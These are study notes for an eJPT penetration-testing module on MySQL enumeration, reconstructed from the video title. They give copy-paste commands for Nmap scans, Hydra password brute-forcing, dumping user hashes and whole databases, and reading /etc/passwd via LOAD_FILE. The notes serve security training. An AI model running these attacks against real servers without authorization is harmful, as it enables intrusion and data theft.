# 10 - MySQL Enumeration (eJPT)

Note: No transcript was provided. The following summary is inferred conservatively from the video title and typical eJPT MySQL service-enumeration workflow.

## What the video covers (Introduction / big picture)
- Identifying and enumerating MySQL/MariaDB services during a network pentest.
- Fingerprinting version and configuration, checking for weak/default credentials.
- Enumerating users, privileges, databases, and tables once authenticated.
- Extracting data and configuration, dumping databases, and leveraging file read/write when allowed.
- Using Nmap NSE, Hydra, mysql client, mysqldump, and Metasploit to automate common tasks.

## Flow (ordered)
1. Discover MySQL (default port 3306) and fingerprint version.
2. Quick checks: banner grab, empty-password test, and default credentials.
3. Targeted brute-force (low, safe thread count).
4. Authenticate with valid creds; enumerate environment (version, hostname, datadir).
5. Enumerate permissions, users, and databases.
6. Review interesting schemas: information_schema, mysql, app-specific DBs.
7. Dump data (mysqldump) and/or extract specific tables.
8. Check file read/write capabilities (LOAD_FILE / INTO OUTFILE) respecting secure_file_priv.
9. Optional: use Metasploit modules for quick login, schema dump, hash dump.
10. Organize loot and document findings.

## Tools highlighted
- Nmap with NSE:
  - mysql-info, mysql-empty-password, mysql-variables, mysql-users, mysql-databases, mysql-brute, mysql-dump-hashes (some require creds).
- netcat (nc) for banner/handshake peek.
- mysql client (mysql, mysqlshow, mysqladmin), mysqldump.
- Hydra for password guessing against the MySQL service.
- Metasploit auxiliary modules (e.g., mysql_login, mysql_version, mysql_sql, mysql_hashdump; names vary slightly by version).

## Typical command walkthrough (detailed, copy-paste friendly)
Set target helpers:
```bash
export IP=10.10.10.10
export PORT=3306
```

1) Quick discovery and fingerprint
```bash
# Basic port/version detection
nmap -p $PORT -sV -oN nmap_mysql_sV.txt $IP

# Default scripts + version (may catch mysql-info)
nmap -p $PORT -sV -sC -oN nmap_mysql_default.txt $IP

# Explicit MySQL NSE fingerprint
nmap -p $PORT --script mysql-info -oN nmap_mysql_info.txt $IP

# Banner/handshake peek (often shows server version)
nc -nv $IP $PORT
```

2) Quick weak-cred checks
```bash
# Empty password check (scripted)
nmap -p $PORT --script mysql-empty-password -oN nmap_mysql_empty_pw.txt $IP

# Try common defaults interactively if allowed remotely
# (Note: many servers restrict root to localhost)
mysql -h $IP -P $PORT -u root -p
# Try: empty password, 'root', 'password', 'admin'
```

3) Targeted brute-force (keep it gentle)
```bash
# Small username list and small password list recommended
# -t to limit threads, -f stop after first hit, -I ignore errors on flaky services
hydra -L users.txt -P passwords.txt -s $PORT -t 4 -I -f -o hydra_mysql.txt $IP mysql

# Quick single-user attempt (e.g., root)
# hydra -l root -P /path/to/wordlist -s $PORT -t 4 -I -f -o hydra_mysql_root.txt $IP mysql
```

4) Authenticated enumeration
```bash
# Set discovered credentials
export U='user'
export P='pass'

# Basic environment and instance info
mysql -h $IP -P $PORT -u "$U" -p"$P" -e 'SELECT USER(),CURRENT_USER(),@@hostname,@@version,@@version_comment,@@datadir;'

# Server variables snapshot (handy for secure_file_priv and paths)
mysql -h $IP -P $PORT -u "$U" -p"$P" -e 'SHOW VARIABLES WHERE Variable_name IN ("basedir","datadir","plugin_dir","secure_file_priv","version","version_comment");'

# Check privileges for the current account
mysql -h $IP -P $PORT -u "$U" -p"$P" -e 'SHOW GRANTS FOR CURRENT_USER();'

# List databases
mysql -h $IP -P $PORT -u "$U" -p"$P" -e 'SHOW DATABASES;'

# Enumerate tables in a target DB
export DB='target_db'
mysql -h $IP -P $PORT -u "$U" -p"$P" -D "$DB" -e 'SHOW TABLES;'

# Describe a table and preview data
export TBL='users'
mysql -h $IP -P $PORT -u "$U" -p"$P" -D "$DB" -e "DESCRIBE \`$TBL\`;"
mysql -h $IP -P $PORT -u "$U" -p"$P" -D "$DB" -e "SELECT * FROM \`$TBL\` LIMIT 10;"
```

5) User/account insights (requires sufficient privileges)
```bash
# MySQL/MariaDB user accounts and auth info
mysql -h $IP -P $PORT -u "$U" -p"$P" -e 'SELECT user,host,plugin,authentication_string FROM mysql.user;'
```

6) Dump data
```bash
# Dump a specific database
mysqldump -h $IP -P $PORT -u "$U" -p"$P" --databases "$DB" > "${DB}.sql"

# Dump all databases (if permitted)
mysqldump -h $IP -P $PORT -u "$U" -p"$P" --all-databases --single-transaction --quick --set-gtid-purged=OFF > all_dbs.sql
```

7) File read/write checks (only if FILE privilege and policy allow)
```bash
# Check file operation restrictions
mysql -h $IP -P $PORT -u "$U" -p"$P" -e 'SHOW VARIABLES LIKE "secure_file_priv";'

# Read a system file (Linux). Requires FILE privilege and readable path.
mysql -h $IP -P $PORT -u "$U" -p"$P" -e 'SELECT LOAD_FILE("/etc/passwd")\G'

# Write a file (e.g., note output path must be within secure_file_priv if set)
mysql -h $IP -P $PORT -u "$U" -p"$P" -e 'SELECT "test-from-mysql" INTO OUTFILE "/tmp/mysql_out.txt";'
```

8) Nmap NSE with credentials (deeper enumeration)
```bash
# Variables and databases via NSE (uses credentials)
nmap -p $PORT --script "mysql-variables,mysql-databases" \
  --script-args "mysqluser=$U,mysqlpass=$P" -oN nmap_mysql_enum_with_creds.txt $IP

# Attempt hash dump (if privileged; may require admin-level rights)
nmap -p $PORT --script mysql-dump-hashes --script-args "mysqluser=$U,mysqlpass=$P" \
  -oN nmap_mysql_hashdump.txt $IP
```

9) Metasploit (if allowed in your workflow)
```bash
msfconsole -q
# Inside msf
use auxiliary/scanner/mysql/mysql_version
set RHOSTS $IP
set RPORT $PORT
run

use auxiliary/scanner/mysql/mysql_login
set RHOSTS $IP
set RPORT $PORT
set USER_FILE users.txt
set PASS_FILE passwords.txt
set STOP_ON_SUCCESS true
run

# With valid creds
use auxiliary/admin/mysql/mysql_sql   # run arbitrary SQL
set RHOSTS $IP
set RPORT $PORT
set USERNAME $U
set PASSWORD $P
run

use auxiliary/admin/mysql/mysql_hashdump  # if privileges allow
set RHOSTS $IP
set RPORT $PORT
set USERNAME $U
set PASSWORD $P
run
```

10) Useful locations and files (reference)
- Config: /etc/mysql/my.cnf, /etc/mysql/mysql.conf.d/mysqld.cnf, or /etc/my.cnf (Linux); C:\ProgramData\MySQL\MySQL Server X.Y\my.ini (Windows)
- Data dir: often /var/lib/mysql (Linux)
- Socket: /var/run/mysqld/mysqld.sock (local connections)
- Logs: /var/log/mysql/error.log or /var/log/mysqld.log

## Practical tips
- MySQL may restrict root to localhost; try non-root accounts and app creds observed elsewhere.
- Banner/handshake often reveals “5.x/MariaDB” via nc or mysql-info NSE; note version for vulnerability research.
- For brute-force, keep threads low (e.g., -t 4) to avoid lockouts and unreliable results.
- Use mysql -e and -sN for scriptable, clean outputs when chaining commands.
- secure_file_priv controls file read/write locations:
  - NULL: file operations disabled.
  - Empty: no restriction.
  - Path: only that directory is permitted.
- FILE privilege is required for LOAD_FILE and INTO OUTFILE; check SHOW GRANTS.
- authentication_string and plugin:
  - mysql_native_password: hashes like *94BD... (John/hashcat formats exist).
  - caching_sha2_password (MySQL 8+): different handling; hash dumping may not be straightforward.
- If performance is slow, the server may use name resolution; adding --skip-name-resolve on server side helps, but as a tester just be patient.
- Always save outputs (nmap, hydra, SQL dumps) with clear filenames for reporting.

## Minimal cheat sheet (one-screen flow)
```bash
export IP=10.10.10.10; export PORT=3306

# Scan + fingerprint
nmap -p $PORT -sV --script mysql-info -oN nmap_mysql_info.txt $IP
nc -nv $IP $PORT

# Quick weak creds
nmap -p $PORT --script mysql-empty-password -oN nmap_mysql_empty_pw.txt $IP
mysql -h $IP -P $PORT -u root -p

# Brute-force (gentle)
hydra -L users.txt -P passwords.txt -s $PORT -t 4 -I -f -o hydra_mysql.txt $IP mysql

# With creds
export U='user'; export P='pass'
mysql -h $IP -P $PORT -u "$U" -p"$P" -e 'SELECT @@version,@@hostname,@@datadir;'
mysql -h $IP -P $PORT -u "$U" -p"$P" -e 'SHOW GRANTS FOR CURRENT_USER();'
mysql -h $IP -P $PORT -u "$U" -p"$P" -e 'SHOW DATABASES;'
mysql -h $IP -P $PORT -u "$U" -p"$P" -D db -e 'SHOW TABLES;'
mysql -h $IP -P $PORT -u "$U" -p"$P" -D db -e 'SELECT * FROM users LIMIT 10;'
mysqldump -h $IP -P $PORT -u "$U" -p"$P" --databases db > db.sql

# File operations check
mysql -h $IP -P $PORT -u "$U" -p"$P" -e 'SHOW VARIABLES LIKE "secure_file_priv";'
mysql -h $IP -P $PORT -u "$U" -p"$P" -e 'SELECT LOAD_FILE("/etc/passwd")\G'
```

## Summary
This MySQL enumeration module focuses on identifying MySQL/MariaDB services, extracting version and configuration details, testing for weak/default logins, and, once authenticated, enumerating users, privileges, databases, and tables. You’ll use Nmap (with specific NSE scripts), Hydra for credential guessing, the mysql client for SQL-based enumeration, mysqldump for data extraction, and Metasploit modules for rapid checks and hash dumps. Key checks include user privileges and secure_file_priv (to assess file read/write), while practical outputs (SQL dumps, nmap/hydra logs) should be saved for reporting and follow-up analysis.